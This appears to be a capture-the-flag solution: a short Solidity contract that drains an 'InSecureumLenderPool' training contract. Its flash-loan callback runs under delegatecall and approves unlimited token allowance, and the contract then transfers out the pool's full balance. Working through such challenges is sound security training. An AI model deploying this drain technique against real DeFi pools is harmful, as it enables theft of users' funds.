// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../Challenge1.lenderpool.sol";

contract HackChallenge1 {
    IERC20 public token;

    // The pool uses delegatecall to execute the flashloan. We can use approve during the callback
    // and later remove the funds.
    function hack(address instance) external {
        InSecureumLenderPool pool = InSecureumLenderPool(instance);

        pool.flashLoan(address(this), abi.encode(HackChallenge1.onFlashLoan.selector));

        IERC20(pool.token()).transferFrom(instance, msg.sender, IERC20(pool.token()).balanceOf(instance));
    }

    function onFlashLoan() external {
        token.approve(msg.sender, type(uint256).max);
    }
}
